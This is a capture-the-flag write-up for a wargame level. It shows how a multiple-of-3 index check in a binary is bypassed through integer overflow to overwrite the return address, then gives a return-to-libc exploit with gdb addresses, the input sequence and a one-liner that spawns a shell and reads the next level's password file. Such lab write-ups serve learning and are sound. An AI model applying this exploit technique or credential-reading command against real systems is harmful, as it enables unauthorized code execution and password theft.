# Overflow bypassing array indexes

see source.c

## Analysis

By analysing the binary with noticed something strange on the check for the index of the array:
```
(i - (((i * 0xaaaaaaab) >> 1) * 3)) == 0
```
With a bit of research we discovered that it's a checker for multiple.
Then for storing values, the program is using: `i << 2` without any further check. That mean we can rewrite eip if we aim high enough. Unfortunately we noticed that the right value to rewrite eip was `114` and it doesn't pass the previous check. So we have to find a high enough value that could pass the bit shift and isn't a multiple of 114 (and 3).

We manage to found that value by searching for values with python:
```
>>> 0b01000000000000000000000001110010
1073741938
```
`1073741938` is perfect ! Then we just have to put a return-to-libc at eip on `system`, and put `/bin/sh` on ebp.
Find right adresses:
```
(gdb) print system
0xf7e6aed0
(gdb) find 0xf7e6aed0, +999999999, "/bin/sh"
0xf7f897ec
```

## Exploit

```
[...]
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
```

```
(echo "store"; echo "4159090384"; echo "1073741938"; echo "store"; echo "4160264172"; echo "116"; echo "quit"; sleep 0.2; echo "cat /home/users/level08/.pass") | ./level07
```
